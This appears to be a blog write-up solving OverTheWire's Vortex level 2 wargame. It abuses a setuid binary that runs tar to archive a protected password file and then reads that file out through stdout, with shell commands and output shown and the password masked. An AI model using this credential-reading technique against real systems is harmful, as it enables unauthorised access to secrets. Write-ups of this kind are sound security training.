+++
title = "OverTheWire: Vortex Level2"
author = "Victor"
date = "2013-05-02"
tags = ["coding", "security", "wargames", "vortex", "appsec"]
category = "blog"
+++

Solution for [level2][1]:

Here is the code:

~~~.c
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>


int main(int argc, char **argv)
{
        char *args[] = { "/bin/tar", "cf", "/tmp/ownership.$$.tar", argv[1], argv[2], argv[3] };
        execv(args[0], args);
}
~~~

**$$** expands to the process ID of the shell.

~~~.shell
$ echo $$
24489
~~~

Let's make some observations:

~~~.shell
vortex2@melissa:~$ ls -l /etc/vortex_pass/vortex3 
-r-------- 1 vortex3 vortex3 10 2011-11-14 18:15 /etc/vortex_pass/vortex3
vortex2@melissa:~$ ls -l /vortex/vortex2
-r-sr-x--- 1 vortex3 vortex2 7134 2011-11-13 23:07 /vortex/vortex2
~~~

The password file is owned by **vortex3**. And the binary **/vortex/vortex3** is allowed to read this file. So we are allowed to tar this file using the binary. The binary itself expects 3 arguments. There we go:

~~~.shell
vortex2@melissa:/etc/vortex_pass$ /vortex/vortex2 vortex3 vortex3 vortex3 
/bin/tar: U\211\345WVS\350Z: Cannot stat: No such file or directory
/bin/tar: Exiting with failure status due to previous errors
vortex2@melissa:/etc/vortex_pass$ ls -l '/tmp/ownership.$$.tar'
-rw-r--r-- 1 vortex3 vortex2 10240 2012-10-31 18:59 /tmp/ownership.$$.tar
vortex2@melissa:/etc/vortex_pass$ cd /tmp/****
vortex2@melissa:/tmp/****$ cp '/tmp/ownership.$$.tar' .
cp: cannot create regular file `./ownership.$$.tar': Permission denied
~~~

Obviously we are not allowed to copy/untar the file. What about STDOUT?

~~~.shell
$ tar xf '/tmp/ownership.$$.tar' -O
*******
~~~

Password revealed. Next level!

 [1]: http://www.overthewire.org/wargames/vortex/vortex2.shtml
